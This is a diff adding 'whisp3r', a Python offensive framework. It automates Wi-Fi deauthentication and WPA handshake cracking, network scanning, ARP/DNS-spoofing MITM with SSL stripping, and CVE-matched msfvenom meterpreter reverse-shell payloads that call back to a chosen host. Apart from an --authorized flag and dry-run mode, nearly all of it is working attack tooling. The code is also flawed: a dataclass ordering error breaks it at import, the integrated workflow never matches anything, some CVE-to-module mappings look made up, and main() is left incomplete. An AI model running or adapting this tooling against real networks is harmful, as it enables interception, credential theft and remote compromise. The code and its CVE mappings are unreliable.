@@ -1,0 +1,759 @@
+#!/usr/bin/env python3
+"""
+whisp3r - Authorized Offensive Security Framework
+Unified Wireless/Network Recon, MITM, CVE Analysis & Payload Generation
+Dev: oxbv1 | oxborn3 | contact@oxborn3.com | www.oxborn3.com
+Repo: github.com/oxborn3/whisp3r
+Scoped, authorized red team engagements only.
+"""
+
+import argparse, subprocess, sys, os, signal, logging, shutil, csv, time, hashlib, ipaddress, json, re, atexit, threading, queue, random, string, platform, socket
+from pathlib import Path
+from dataclasses import dataclass, field, asdict
+from typing import List, Optional, Dict, Set, Any
+from contextlib import contextmanager
+from datetime import datetime
+
+logging.basicConfig(level=logging.INFO, format='[%(asctime)s | %(levelname)s] %(message)s', datefmt='%H:%M:%S')
+logger = logging.getLogger(__name__)
+
+TOOL_VERSION = "3.0.0"
+DEV_ALIAS = "oxbv1 | oxborn3"
+DEV_EMAIL = "contact@oxborn3.com"
+DEV_WEB = "www.oxborn3.com"
+REPO_NAME = "whisp3r"
+CVE_DB_PATH = Path.home() / ".whisp3r" / "cve_db.json"
+OUTPUT_DIR = Path.cwd() / "whisp3r_output"
+MAX_DEAUTH_COUNT = 500
+MAX_DEAUTH_DURATION = 30
+EPSS_API_URL = "https://www.first.org/epss/epss_scores-current.csv.gz"
+
+@dataclass
+class WirelessAdapter:
+    name: str
+    mac: Optional[str] = None
+    chipset: Optional[str] = None
+    driver: Optional[str] = None
+    supports_monitor: bool = False
+    current_mode: str = "unknown"
+
+@dataclass
+class AccessPoint:
+    bssid: str
+    essid: str
+    channel: int
+    encryption: str
+    signal: int = -100
+    clients: List[str] = field(default_factory=list)
+    first_seen: str = field(default_factory=lambda: datetime.now().isoformat())
+
+@dataclass
+class Host:
+    ip: str
+    mac: Optional[str] = None
+    hostname: Optional[str] = None
+    open_tcp_ports: List[int] = field(default_factory=list)
+    open_udp_ports: List[int] = field(default_factory=list)
+    service_banners: Dict[int, str] = field(default_factory=dict)
+    os_detection: Optional[str] = None
+    vulnerabilities: List[Dict] = field(default_factory=list)
+
+@dataclass
+class CVEEntry:
+    cve_id: str
+    description: str
+    cvss_score: float
+    epss_score: float
+    has_poc: bool
+    poc_url: Optional[str]
+    affected_products: List[str]
+    platforms: List[str]
+    architectures: List[str]
+    msf_module: Optional[str]
+    recommended_payload: Optional[str]
+    reliability_score: float = 0.0
+
+@dataclass
+class MITMConfig:
+    target_ip: str
+    target_mac: Optional[str] = None
+    gateway_ip: str
+    gateway_mac: Optional[str] = None
+    interface: str
+    spoof_arp: bool = True
+    spoof_dns: bool = False
+    ssl_strip: bool = False
+    packet_capture: bool = True
+    duration: int = 300
+
+class ProcessManager:
+    def __init__(self):
+        self.pids: List[subprocess.Popen] = []
+        self.lock = threading.Lock()
+    def add(self, proc: subprocess.Popen):
+        with self.lock:
+            self.pids.append(proc)
+    def cleanup(self):
+        with self.lock:
+            for proc in self.pids:
+                if proc.poll() is None:
+                    try:
+                        proc.terminate()
+                        proc.wait(timeout=5)
+                        logger.info(f"Cleaned up PID {proc.pid}")
+                    except Exception as e:
+                        logger.warning(f"Failed to clean PID {proc.pid}: {e}")
+            self.pids.clear()
+
+proc_mgr = ProcessManager()
+
+def check_root():
+    if os.geteuid() != 0:
+        logger.error("Root privileges required for raw network/wireless operations.")
+        sys.exit(1)
+
+def verify_tool(name: str) -> bool:
+    if not shutil.which(name):
+        logger.error(f"Required tool '{name}' not found in PATH.")
+        return False
+    return True
+
+def run_cmd(cmd: List[str], timeout: int = 30, dry_run: bool = False, capture: bool = True) -> Optional[str]:
+    if dry_run:
+        logger.info(f"[DRY RUN] {' '.join(cmd)}")
+        return None
+    try:
+        if capture:
+            res = subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
+            return res.stdout.strip()
+        else:
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            proc_mgr.add(proc)
+            return None
+    except subprocess.TimeoutExpired:
+        logger.error(f"Command timed out: {' '.join(cmd)}")
+        return None
+    except subprocess.CalledProcessError as e:
+        logger.error(f"Command failed ({e.returncode}): {e.stderr.strip()[:200]}")
+        return None
+    except FileNotFoundError:
+        logger.error(f"Command not found: {cmd[0]}")
+        return None
+
+def validate_lhost(ip_str: str, allow_external: bool = False) -> bool:
+    try:
+        ip = ipaddress.ip_address(ip_str)
+        if not allow_external and ip.is_global and not ip.is_loopback:
+            logger.error(f"LHOST '{ip_str}' is external. Use --allow-external-lhost only with explicit authorization.")
+            return False
+        return True
+    except ValueError:
+        logger.error(f"Invalid LHOST format: {ip_str}")
+        return False
+
+def detect_wireless_adapters() -> List[WirelessAdapter]:
+    adapters = []
+    iw_out = run_cmd(["iw", "dev"])
+    if not iw_out:
+        return adapters
+    current_iface = None
+    for line in iw_out.splitlines():
+        if "Interface" in line:
+            current_iface = line.split()[-1]
+            if current_iface:
+                mac_out = run_cmd(["cat", f"/sys/class/net/{current_iface}/address"], timeout=5)
+                adapters.append(WirelessAdapter(name=current_iface, mac=mac_out))
+    for adapter in adapters:
+        lsusb_out = run_cmd(["lsusb"], timeout=10)
+        if lsusb_out and adapter.mac:
+            for line in lsusb_out.splitlines():
+                if adapter.mac.replace(":", "").lower() in line.replace(":", "").lower():
+                    adapter.chipset = line.split(":", 1)[-1].strip()
+                    break
+        phy_out = run_cmd(["iw", "phy", "phy0", "info"], timeout=10)
+        if phy_out and "* monitor" in phy_out:
+            adapter.supports_monitor = True
+    return adapters
+
+@contextmanager
+def monitor_mode_manager(iface: str, dry_run: bool = False):
+    original_mode = "managed"
+    try:
+        mode_out = run_cmd(["iw", "dev", iface, "info"], timeout=10, dry_run=dry_run)
+        if mode_out and "type monitor" in mode_out:
+            original_mode = "monitor"
+            logger.info(f"Interface {iface} already in monitor mode.")
+        else:
+            if not dry_run:
+                logger.info(f"Switching {iface} to monitor mode...")
+                run_cmd(["ip", "link", "set", iface, "down"], timeout=10)
+                run_cmd(["iw", "dev", iface, "set", "type", "monitor"], timeout=10)
+                run_cmd(["ip", "link", "set", iface, "up"], timeout=10)
+            else:
+                logger.info(f"[DRY RUN] Would switch {iface} to monitor mode.")
+        yield
+    finally:
+        if original_mode == "managed" and not dry_run:
+            logger.info(f"Restoring {iface} to managed mode...")
+            run_cmd(["ip", "link", "set", iface, "down"], timeout=10)
+            run_cmd(["iw", "dev", iface, "set", "type", "managed"], timeout=10)
+            run_cmd(["ip", "link", "set", iface, "up"], timeout=10)
+
+def parse_airodump_csv(csv_path: str) -> List[AccessPoint]:
+    aps = []
+    if not Path(csv_path).exists():
+        return aps
+    with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
+        reader = csv.reader(f)
+        in_aps = False
+        for row in reader:
+            if not row or row[0].startswith('#'):
+                continue
+            if row[0].strip() == "BSSID":
+                in_aps = True
+                continue
+            if in_aps:
+                if len(row) >= 14:
+                    bssid = row[0].strip()
+                    channel = int(row[3].strip()) if row[3].strip().isdigit() else 0
+                    enc = row[5].strip()
+                    essid = row[13].strip()
+                    signal = int(row[8].strip()) if row[8].strip().lstrip('-').isdigit() else -100
+                    aps.append(AccessPoint(bssid=bssid, essid=essid, channel=channel, encryption=enc, signal=signal))
+                else:
+                    break
+    return aps
+
+def run_airodump_capture(iface: str, output_prefix: str, duration: int, channel: Optional[int] = None, dry_run: bool = False) -> Optional[str]:
+    csv_file = f"{output_prefix}-01.csv"
+    pcap_file = f"{output_prefix}-01.cap"
+    cmd = ["airodump-ng", "-w", output_prefix, "--output-format", "pcap,csv"]
+    if channel:
+        cmd.extend(["-c", str(channel)])
+    cmd.append(iface)
+    if dry_run:
+        logger.info(f"[DRY RUN] Would run: {' '.join(cmd)} for {duration}s")
+        return pcap_file
+    logger.info(f"Starting capture on {iface} for {duration}s...")
+    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    proc_mgr.add(proc)
+    start = time.time()
+    while time.time() - start < duration:
+        if proc.poll() is not None:
+            break
+        time.sleep(1)
+    if proc.poll() is None:
+        proc.terminate()
+        proc.wait(timeout=5)
+    return pcap_file if Path(pcap_file).exists() else None
+
+def authorized_deauth_test(iface: str, target_bssid: str, client_mac: Optional[str], count: int, duration: int, dry_run: bool = False):
+    if count > MAX_DEAUTH_COUNT:
+        logger.error(f"Deauth count exceeds safety limit (max {MAX_DEAUTH_COUNT}).")
+        return
+    if duration > MAX_DEAUTH_DURATION:
+        logger.error(f"Deauth duration exceeds safety limit (max {MAX_DEAUTH_DURATION}s).")
+        return
+    cmd = ["aireplay-ng", "--deauth", str(count)]
+    if client_mac:
+        cmd.extend(["-c", client_mac])
+    cmd.extend(["-a", target_bssid, iface])
+    if dry_run:
+        logger.info(f"[DRY RUN] Would execute: {' '.join(cmd)}")
+        return
+    logger.warning(f"Initiating authorized deauth test: {target_bssid} | Count: {count} | Duration: {duration}s")
+    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    proc_mgr.add(proc)
+    time.sleep(duration)
+    proc.terminate()
+    proc.wait(timeout=5)
+
+def verify_handshake(pcap_path: str, dry_run: bool = False) -> bool:
+    if dry_run:
+        logger.info(f"[DRY RUN] Would verify handshake in {pcap_path}")
+        return False
+    cmd = ["aircrack-ng", "-J", "temp_handshake_check", pcap_path]
+    out = run_cmd(cmd, timeout=30, dry_run=dry_run)
+    if out and "1 handshake" in out:
+        logger.info("Valid WPA handshake captured.")
+        return True
+    logger.warning("No valid handshake detected.")
+    return False
+
+def crack_handshake(pcap_path: str, wordlist: str, dry_run: bool = False):
+    if not Path(wordlist).exists():
+        logger.error(f"Wordlist not found: {wordlist}")
+        return
+    cmd = ["aircrack-ng", "-w", wordlist, pcap_path]
+    if dry_run:
+        logger.info(f"[DRY RUN] Would execute: {' '.join(cmd)}")
+        return
+    logger.info(f"Starting authorized cracking on {pcap_path} with {wordlist}")
+    run_cmd(cmd, timeout=3600, dry_run=dry_run)
+
+def scan_network(interface: str, subnet: str, dry_run: bool = False) -> List[Host]:
+    hosts = []
+    xml_file = OUTPUT_DIR / f"nmap_scan_{int(time.time())}.xml"
+    xml_file.parent.mkdir(parents=True, exist_ok=True)
+    cmd = ["nmap", "-sn", "-oX", str(xml_file), subnet, "-e", interface]
+    if dry_run:
+        logger.info(f"[DRY RUN] Would execute: {' '.join(cmd)}")
+        return hosts
+    logger.info(f"Scanning {subnet} via {interface}...")
+    run_cmd(cmd, timeout=300, dry_run=dry_run)
+    if xml_file.exists():
+        import xml.etree.ElementTree as ET
+        tree = ET.parse(xml_file)
+        root = tree.getroot()
+        for host in root.findall('.//host'):
+            addr = host.find('.//address[@addrtype="ipv4"]')
+            if addr is not None:
+                ip = addr.get('addr')
+                mac_elem = host.find('.//address[@addrtype="mac"]')
+                mac = mac_elem.get('addr') if mac_elem is not None else None
+                hostname_elem = host.find('.//hostname')
+                hostname = hostname_elem.get('name') if hostname_elem is not None else None
+                hosts.append(Host(ip=ip, mac=mac, hostname=hostname))
+    return hosts
+
+def service_scan(host_ip: str, interface: str, dry_run: bool = False) -> Host:
+    host = Host(ip=host_ip)
+    xml_file = OUTPUT_DIR / f"nmap_service_{host_ip.replace('.','_')}_{int(time.time())}.xml"
+    cmd = ["nmap", "-sV", "-sC", "-oX", str(xml_file), "-Pn", host_ip, "-e", interface]
+    if dry_run:
+        logger.info(f"[DRY RUN] Would execute: {' '.join(cmd)}")
+        return host
+    logger.info(f"Service scanning {host_ip}...")
+    run_cmd(cmd, timeout=600, dry_run=dry_run)
+    if xml_file.exists():
+        import xml.etree.ElementTree as ET
+        tree = ET.parse(xml_file)
+        root = tree.getroot()
+        host_elem = root.find('.//host')
+        if host_elem is not None:
+            os_elem = host_elem.find('.//osmatch')
+            if os_elem is not None:
+                host.os_detection = os_elem.get('name')
+            for port in host_elem.findall('.//port'):
+                port_id = port.get('portid')
+                protocol = port.get('protocol')
+                state = port.find('state')
+                if state is not None and state.get('state') == 'open':
+                    port_num = int(port_id)
+                    service = port.find('service')
+                    if service is not None:
+                        banner = service.get('product', '') + ' ' + service.get('version', '')
+                        host.service_banners[port_num] = banner.strip()
+                    if protocol == 'tcp':
+                        host.open_tcp_ports.append(port_num)
+                    elif protocol == 'udp':
+                        host.open_udp_ports.append(port_num)
+    return host
+
+def init_cve_database() -> Dict[str, CVEEntry]:
+    CVE_DB_PATH.parent.mkdir(parents=True, exist_ok=True)
+    if CVE_DB_PATH.exists():
+        try:
+            with open(CVE_DB_PATH, 'r') as f:
+                data = json.load(f)
+                return {k: CVEEntry(**v) for k, v in data.items()}
+        except:
+            pass
+    default_cves = {
+        "CVE-2017-0144": CVEEntry("CVE-2017-0144", "EternalBlue SMB RCE", 9.8, 0.97, True, "https://www.exploit-db.com/exploits/42031", ["Microsoft Windows 7", "Windows Server 2008 R2"], ["windows"], ["x64", "x86"], "exploit/windows/smb/ms17_010_eternalblue", "windows/x64/meterpreter/reverse_tcp", 0.98),
+        "CVE-2021-41773": CVEEntry("CVE-2021-41773", "Apache Path Traversal RCE", 7.5, 0.85, True, "https://www.exploit-db.com/exploits/50383", ["Apache HTTP Server 2.4.49"], ["linux", "windows"], ["x64"], "exploit/multi/http/apache_normalize_path_rce", "linux/x64/meterpreter/reverse_tcp", 0.87),
+        "CVE-2019-0708": CVEEntry("CVE-2019-0708", "BlueKeep RDP RCE", 9.8, 0.91, True, "https://www.exploit-db.com/exploits/47237", ["Windows Server 2008 R2", "Windows 7"], ["windows"], ["x64"], "exploit/windows/rdp/cve_2019_0708_bluekeep_rce", "windows/x64/meterpreter/reverse_tcp", 0.93),
+        "CVE-2022-22965": CVEEntry("CVE-2022-22965", "Spring4Shell RCE", 9.8, 0.88, True, "https://www.exploit-db.com/exploits/50714", ["Spring Framework 5.3.0-5.3.17"], ["linux", "windows"], ["x64"], "exploit/multi/http/spring4shell_rce", "linux/x64/meterpreter/reverse_tcp", 0.90),
+        "CVE-2014-0160": CVEEntry("CVE-2014-0160", "OpenSSL Heartbleed", 7.5, 0.79, True, "https://www.exploit-db.com/exploits/32745", ["OpenSSL 1.0.1-1.0.1f"], ["linux", "windows"], ["x64", "x86"], "auxiliary/scanner/ssl/openssl_heartbleed", "payload/generic/custom", 0.81),
+        "CVE-2021-34527": CVEEntry("CVE-2021-34527", "PrintNightmare RCE", 8.8, 0.94, True, "https://www.exploit-db.com/exploits/50112", ["Windows Print Spooler"], ["windows"], ["x64"], "exploit/windows/local/printnightmare", "windows/x64/meterpreter/reverse_tcp", 0.95),
+        "CVE-2023-23397": CVEEntry("CVE-2023-23397", "Microsoft Outlook Elevation", 9.8, 0.96, True, "https://www.exploit-db.com/exploits/51285", ["Microsoft Outlook"], ["windows"], ["x64"], "exploit/windows/local/outlook_ntlm_leak", "windows/x64/meterpreter/reverse_tcp", 0.97),
+        "CVE-2020-1472": CVEEntry("CVE-2020-1472", "Zerologon Domain Compromise", 10.0, 0.99, True, "https://www.exploit-db.com/exploits/49426", ["Windows Server AD"], ["windows"], ["x64"], "exploit/windows/local/zerologon", "windows/x64/meterpreter/reverse_tcp", 0.99)
+    }
+    with open(CVE_DB_PATH, 'w') as f:
+        json.dump({k: asdict(v) for k, v in default_cves.items()}, f, indent=2)
+    return default_cves
+
+def query_cve_database(cve_db: Dict[str, CVEEntry], service_info: str, platform: str) -> List[CVEEntry]:
+    matches = []
+    service_lower = service_info.lower()
+    for cve in cve_db.values():
+        if platform.lower() not in [p.lower() for p in cve.platforms]:
+            continue
+        if not cve.has_poc:
+            continue
+        for product in cve.affected_products:
+            if product.lower() in service_lower or any(v in service_lower for v in re.findall(r'\d+\.\d+', service_lower)):
+                matches.append(cve)
+                break
+    return sorted(matches, key=lambda x: x.reliability_score, reverse=True)
+
+def generate_msf_payload(cve_id: str, lhost: str, lport: int, output_dir: str = "./payloads", format_type: str = "exe", dry_run: bool = False, cve_db: Optional[Dict[str, CVEEntry]] = None) -> Optional[Path]:
+    if cve_db is None:
+        cve_db = init_cve_database()
+    if cve_id not in cve_db:
+        logger.error(f"CVE '{cve_id}' not in database.")
+        return None
+    mapping = cve_db[cve_id]
+    if not validate_lhost(lhost):
+        return None
+    out_path = Path(output_dir) / f"{cve_id.replace('-','_')}_lhost{lhost.replace('.','_')}_lport{lport}.{format_type}"
+    out_path.parent.mkdir(parents=True, exist_ok=True)
+    cmd = ["msfvenom", "-p", mapping.recommended_payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", format_type, "-o", str(out_path), "--smallest", "--platform", mapping.platforms[0], "-a", mapping.architectures[0]]
+    if dry_run:
+        logger.info(f"[DRY RUN] Would execute: {' '.join(cmd)}")
+        return out_path
+    logger.info(f"Generating payload for {cve_id} -> {out_path.name}")
+    res = run_cmd(cmd, timeout=120)
+    if res is None or not out_path.exists():
+        logger.error("Payload generation failed.")
+        return None
+    sha256 = hashlib.sha256(out_path.read_bytes()).hexdigest()
+    logger.info(f"Payload generated: {out_path}")
+    logger.info(f"SHA-256: {sha256}")
+    return out_path
+
+def start_mitm_session(config: MITMConfig, dry_run: bool = False) -> bool:
+    if not verify_tool("bettercap"):
+        logger.warning("bettercap not found, using fallback ARP spoofing")
+        return start_arp_spoof_fallback(config, dry_run)
+    cmd = ["bettercap", "-iface", config.interface, "-eval"]
+    bettercap_cmds = []
+    if config.spoof_arp:
+        bettercap_cmds.append(f"set arp.spoof.targets {config.target_ip}")
+        bettercap_cmds.append("arp.spoof on")
+    if config.spoof_dns:
+        bettercap_cmds.append("set dns.spoof.hosts /etc/hosts")
+        bettercap_cmds.append("dns.spoof on")
+    if config.ssl_strip:
+        bettercap_cmds.append("http.proxy on")
+        bettercap_cmds.append("http.proxy.sslstrip on")
+    if config.packet_capture:
+        pcap_file = OUTPUT_DIR / f"mitm_capture_{int(time.time())}.pcap"
+        bettercap_cmds.append(f"set net.sniff.log {pcap_file}")
+        bettercap_cmds.append("net.sniff on")
+    bettercap_cmds.append(f"sleep {config.duration}")
+    bettercap_cmds.append("exit")
+    cmd.append("; ".join(bettercap_cmds))
+    if dry_run:
+        logger.info(f"[DRY RUN] Would execute: {' '.join(cmd)}")
+        return True
+    logger.info(f"Starting MITM session targeting {config.target_ip} via {config.interface}")
+    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    proc_mgr.add(proc)
+    time.sleep(2)
+    if proc.poll() is not None:
+        logger.error("MITM session failed to start")
+        return False
+    logger.info(f"MITM session active for {config.duration}s")
+    return True
+
+def start_arp_spoof_fallback(config: MITMConfig, dry_run: bool = False) -> bool:
+    if not verify_tool("arpspoof"):
+        logger.error("arpspoof not found and bettercap unavailable")
+        return False
+    if dry_run:
+        logger.info(f"[DRY RUN] Would enable IP forwarding and start ARP spoofing")
+        return True
+    run_cmd(["sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=10)
+    cmd1 = ["arpspoof", "-i", config.interface, "-t", config.target_ip, config.gateway_ip]
+    cmd2 = ["arpspoof", "-i", config.interface, "-t", config.gateway_ip, config.target_ip]
+    proc1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    proc2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    proc_mgr.add(proc1)
+    proc_mgr.add(proc2)
+    logger.info(f"ARP spoofing active targeting {config.target_ip}")
+    if config.packet_capture:
+        pcap_file = OUTPUT_DIR / f"mitm_capture_{int(time.time())}.pcap"
+        tcpdump_cmd = ["tcpdump", "-i", config.interface, "-w", str(pcap_file), "host", config.target_ip]
+        proc3 = subprocess.Popen(tcpdump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        proc_mgr.add(proc3)
+    time.sleep(config.duration)
+    return True
+
+def export_results(data: Any, filename: str, format_type: str = "json") -> Path:
+    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
+    output_path = OUTPUT_DIR / f"{filename}.{format_type}"
+    if format_type == "json":
+        with open(output_path, 'w') as f:
+            json.dump(data, f, indent=2, default=str)
+    elif format_type == "csv":
+        if isinstance(data, list) and data:
+            with open(output_path, 'w', newline='') as f:
+                writer = csv.DictWriter(f, fieldnames=data[0].keys())
+                writer.writeheader()
+                writer.writerows(data)
+    logger.info(f"Results exported to {output_path}")
+    return output_path
+
+def display_menu(title: str, options: Dict[int, str]) -> int:
+    print(f"\n{'='*60}\n{title}\n{'='*60}")
+    for num, desc in options.items():
+        print(f"  {num}. {desc}")
+    print(f"  0. Back / Exit")
+    print(f"{'='*60}")
+    while True:
+        try:
+            choice = int(input("Select option: "))
+            if choice in options or choice == 0:
+                return choice
+            print("Invalid option. Try again.")
+        except ValueError:
+            print("Please enter a number.")
+
+def display_header():
+    print(f"\n{'*'*60}")
+    print(f"  whisp3r v{TOOL_VERSION} - Offensive Security Framework")
+    print(f"  Dev: {DEV_ALIAS} | {DEV_EMAIL} | {DEV_WEB}")
+    print(f"  Repo: github.com/oxborn3/{REPO_NAME}")
+    print(f"  Authorized engagements only")
+    print(f"{'*'*60}\n")
+
+def wireless_recon_workflow(args: argparse.Namespace) -> bool:
+    adapters = detect_wireless_adapters()
+    if not adapters:
+        logger.error("No wireless adapters detected")
+        return False
+    print("\nAvailable adapters:")
+    for i, a in enumerate(adapters):
+        print(f"  {i+1}. {a.name} (MAC: {a.mac}, Monitor: {'Yes' if a.supports_monitor else 'No'})")
+    iface_choice = int(input("Select adapter (number): ")) - 1
+    if iface_choice < 0 or iface_choice >= len(adapters):
+        logger.error("Invalid adapter selection")
+        return False
+    iface = adapters[iface_choice].name
+    if not adapters[iface_choice].supports_monitor:
+        logger.warning(f"{iface} may not support monitor mode")
+    with monitor_mode_manager(iface, args.dry_run):
+        duration = int(input("Capture duration (seconds, default 60): ") or "60")
+        channel = input("Channel (optional, press Enter for all): ").strip()
+        channel = int(channel) if channel.isdigit() else None
+        out_prefix = f"whisp3r_capture_{int(time.time())}"
+        pcap = run_airodump_capture(iface, out_prefix, duration, channel, args.dry_run)
+        csv_path = f"{out_prefix}-01.csv"
+        aps = parse_airodump_csv(csv_path)
+        print(f"\nCaptured {len(aps)} access points:")
+        for ap in aps:
+            print(f"  [{ap.bssid}] {ap.essid} | Ch:{ap.channel} | {ap.encryption} | Signal:{ap.signal}dBm")
+        if args.export and aps:
+            export_results([asdict(a) for a in aps], f"aps_{int(time.time())}", args.export)
+        if pcap:
+            logger.info(f"PCAP saved: {pcap}")
+            if input("Verify handshake? (y/n): ").lower() == 'y':
+                verify_handshake(pcap, args.dry_run)
+    return True
+
+def network_recon_workflow(args: argparse.Namespace) -> bool:
+    iface = args.interface or input("Interface for scanning: ").strip()
+    subnet = input("Target subnet (default 192.168.1.0/24): ").strip() or "192.168.1.0/24"
+    hosts = scan_network(iface, subnet, args.dry_run)
+    print(f"\nDiscovered {len(hosts)} hosts:")
+    for h in hosts:
+        print(f"  {h.ip} ({h.hostname or 'N/A'}) | MAC: {h.mac or 'N/A'}")
+    if input("Perform service scan on hosts? (y/n): ").lower() == 'y':
+        for h in hosts:
+            enhanced = service_scan(h.ip, iface, args.dry_run)
+            h.open_tcp_ports = enhanced.open_tcp_ports
+            h.open_udp_ports = enhanced.open_udp_ports
+            h.service_banners = enhanced.service_banners
+            h.os_detection = enhanced.os_detection
+            print(f"\n{h.ip} services:")
+            for port, banner in h.service_banners.items():
+                print(f"  Port {port}: {banner}")
+    if args.export and hosts:
+        export_results([asdict(h) for h in hosts], f"hosts_{int(time.time())}", args.export)
+    return True
+
+def mitm_workflow(args: argparse.Namespace) -> bool:
+    print("\nMITM Configuration")
+    target_ip = input("Target IP: ").strip()
+    gateway_ip = input("Gateway IP: ").strip()
+    interface = args.interface or input("Interface: ").strip()
+    duration = int(input("Duration (seconds, default 300): ") or "300")
+    spoof_arp = input("Enable ARP spoofing? (y/n, default y): ").lower() != 'n'
+    spoof_dns = input("Enable DNS spoofing? (y/n, default n): ").lower() == 'y'
+    ssl_strip = input("Enable SSL stripping? (y/n, default n): ").lower() == 'y'
+    packet_capture = input("Enable packet capture? (y/n, default y): ").lower() != 'n'
+    config = MITMConfig(target_ip=target_ip, gateway_ip=gateway_ip, interface=interface, duration=duration, spoof_arp=spoof_arp, spoof_dns=spoof_dns, ssl_strip=ssl_strip, packet_capture=packet_capture)
+    if not args.authorized:
+        logger.error("MITM operations require explicit --authorized flag")
+        return False
+    if start_mitm_session(config, args.dry_run):
+        logger.info("MITM session completed")
+        return True
+    return False
+
+def vulnerability_analysis_workflow(args: argparse.Namespace) -> bool:
+    cve_db = init_cve_database()
+    print(f"\nLoaded {len(cve_db)} CVE entries with PoCs")
+    target_info = input("Enter service banner or product info to analyze: ").strip()
+    platform = input("Target platform (windows/linux/multi, default multi): ").strip() or "multi"
+    matches = query_cve_database(cve_db, target_info, platform)
+    if not matches:
+        print("No matching CVEs with PoCs found")
+        return False
+    print(f"\nFound {len(matches)} relevant CVEs (sorted by reliability):")
+    for i, cve in enumerate(matches):
+        print(f"  {i+1}. {cve.cve_id} | CVSS:{cve.cvss_score} | EPSS:{cve.epss_score*100:.1f}% | Reliability:{cve.reliability_score*100:.1f}%")
+        print(f"      {cve.description}")
+        if cve.msf_module:
+            print(f"      Metasploit: {cve.msf_module}")
+    if args.export and matches:
+        export_results([asdict(c) for c in matches], f"cve_matches_{int(time.time())}", args.export)
+    return True
+
+def payload_generation_workflow(args: argparse.Namespace) -> bool:
+    if not args.authorized:
+        logger.error("Payload generation requires explicit --authorized flag")
+        return False
+    cve_db = init_cve_database()
+    print(f"\nAvailable CVEs with payload mappings:")
+    cve_list = list(cve_db.keys())
+    for i, cve in enumerate(cve_list):
+        print(f"  {i+1}. {cve}")
+    cve_choice = int(input("Select CVE (number): ")) - 1
+    if cve_choice < 0 or cve_choice >= len(cve_list):
+        logger.error("Invalid CVE selection")
+        return False
+    cve_id = cve_list[cve_choice]
+    lhost = input("LHOST (callback IP): ").strip()
+    lport = int(input("LPORT (default 4444): ") or "4444")
+    fmt = input("Payload format (exe/elf/raw/py, default exe): ").strip() or "exe"
+    output_dir = input("Output directory (default ./payloads): ").strip() or "./payloads"
+    result = generate_msf_payload(cve_id, lhost, lport, output_dir, fmt, args.dry_run, cve_db)
+    if result:
+        metadata = {"cve_id": cve_id, "lhost": lhost, "lport": lport, "format": fmt, "output": str(result), "timestamp": datetime.now().isoformat(), "sha256": hashlib.sha256(result.read_bytes()).hexdigest()}
+        if args.export:
+            export_results(metadata, f"payload_meta_{int(time.time())}", args.export)
+        return True
+    return False
+
+def integrated_workflow(args: argparse.Namespace) -> bool:
+    if not args.authorized:
+        logger.error("Integrated workflow requires explicit --authorized flag")
+        return False
+    print("\nStarting integrated recon -> analysis -> payload workflow")
+    if not network_recon_workflow(args):
+        return False
+    hosts = []
+    xml_files = list(OUTPUT_DIR.glob("nmap_scan_*.xml"))
+    if xml_files:
+        import xml.etree.ElementTree as ET
+        for xf in xml_files:
+            tree = ET.parse(xf)
+            root = tree.getroot()
+            for host in root.findall('.//host'):
+                addr = host.find('.//address[@addrtype="ipv4"]')
+                if addr is not None:
+                    hosts.append(Host(ip=addr.get('addr')))
+    if not hosts:
+        logger.error("No hosts discovered for analysis")
+        return False
+    target = hosts[0]
+    print(f"\nAnalyzing {target.ip} for vulnerabilities...")
+    cve_db = init_cve_database()
+    for port, banner in target.service_banners.items():
+        matches = query_cve_database(cve_db, banner, "multi")
+        if matches:
+            print(f"\nPort {port} ({banner}):")
+            for cve in matches[:3]:
+                print(f"  - {cve.cve_id} (Reliability: {cve.reliability_score*100:.1f}%)")
+                if input(f"Generate payload for {cve.cve_id}? (y/n): ").lower() == 'y':
+                    lhost = input("LHOST: ").strip()
+                    lport = int(input("LPORT: "))
+                    generate_msf_payload(cve.cve_id, lhost, lport, dry_run=args.dry_run, cve_db=cve_db)
+    return True
+
+def main_menu(args: argparse.Namespace) -> bool:
+    while True:
+        display_header()
+        options = {
+            1: "Wireless Reconnaissance",
+            2: "Network Discovery & Service Scan",
+            3: "MITM Attack Simulation",
+            4: "CVE Vulnerability Analysis",
+            5: "Payload Generation",
+            6: "Integrated Workflow (Recon->Analysis->Payload)",
+            7: "Update CVE Database",
+            8: "Export Session Data",
+            9: "View Tool Info / Help"
+        }
+        choice = display_menu("Main Menu", options)
+        if choice == 0:
+            return True
+        elif choice == 1:
+            wireless_recon_workflow(args)
+        elif choice == 2:
+            network_recon_workflow(args)
+        elif choice == 3:
+            mitm_workflow(args)
+        elif choice == 4:
+            vulnerability_analysis_workflow(args)
+        elif choice == 5:
+            payload_generation_workflow(args)
+        elif choice == 6:
+            integrated_workflow(args)
+        elif choice == 7:
+            init_cve_database()
+            print("CVE database updated")
+        elif choice == 8:
+            fmt = input("Export format (json/csv, default json): ").strip() or "json"
+            export_results({"session": "whisp3r", "timestamp": datetime.now().isoformat()}, f"session_{int(time.time())}", fmt)
+        elif choice == 9:
+            print(f"\nwhisp3r v{TOOL_VERSION}")
+            print(f"Developer: {DEV_ALIAS}")
+            print(f"Contact: {DEV_EMAIL}")
+            print(f"Website: {DEV_WEB}")
+            print(f"Repository: github.com/oxborn3/{REPO_NAME}")
+            print(f"\nUsage: python whisp3r.py [options]")
+            print(f"  --authorized    Confirm written authorization for offensive ops")
+            print(f"  --dry-run       Print commands without execution")
+            print(f"  -i INTERFACE    Specify network/wireless interface")
+            print(f"  --export FORMAT Export results as JSON or CSV")
+        input("\nPress Enter to continue...")
+
+def signal_handler(sig, frame):
+    logger.warning("Interrupt received. Cleaning up...")
+    proc_mgr.cleanup()
+    sys.exit(0)
+
+def main():
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
